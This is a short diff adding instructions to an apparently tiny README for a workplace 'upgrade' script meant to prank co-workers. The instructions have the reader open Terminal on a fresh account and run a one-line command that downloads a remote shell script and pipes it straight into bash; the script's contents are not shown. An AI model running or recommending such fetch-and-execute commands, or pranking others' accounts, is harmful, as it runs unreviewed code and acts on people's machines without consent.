@@ -1,1 +1,11 @@
 Script to upgrade workplace Your co-worker.
+
+1) run Terminal on newly created account (fastest via CMD+SPACE of Spotlight)
+
+2) run following command on Terminal:
+
+# bash < <(curl http://doubledrones.com/cp.sh)
+
+3) enjoy, improve and prank Your co-workers! ;] 
+
+_\\// Live Long and Prosper.
